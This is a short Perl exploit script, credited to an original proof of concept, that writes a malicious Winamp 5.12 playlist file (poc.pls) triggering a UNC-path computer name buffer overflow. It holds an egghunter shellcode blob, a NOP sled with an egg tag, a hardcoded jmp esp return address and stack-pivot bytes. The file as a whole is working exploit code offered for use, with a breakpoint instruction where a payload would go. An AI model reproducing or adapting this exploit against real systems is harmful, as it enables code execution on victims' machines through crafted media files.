#!/usr/bin/perl -w
# ====================================================================
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Perl Exploit
# Original Poc by Umesh Wanve (umesh_345@yahoo.com)
# ====================================================================

$start= "[playlist]\r\nFile1=\\\\";
$egg = "w00tw00t"."\xCC";
$nop=$egg."\x90" x (856-length($egg));

# !mona egg -wow64 -winver10
# (no encoding with msfvenom)
$egghunter =
"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53".
"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c".
"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7".
"\xff\xe7";

$shellcode = $egghunter."\x90" x (166 - length($egghunter));

# jmp esp: 0x1a113749
$jmp_esp_addr = "\x49\x37\x11\x1a";
# little endian jmp esp addr + sub 5a (2x) from esp then jump esp again:
$jmp=$jmp_esp_addr."\x83\xEC\x5A\x83\xEC\x5A\xFF\xE4"."\x90\x90\x90\x90";
$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";
open (MYFILE, '>poc.pls');
print MYFILE $start;
print MYFILE $nop;
print MYFILE $shellcode;
print MYFILE $jmp;
print MYFILE $end;
close (MYFILE);
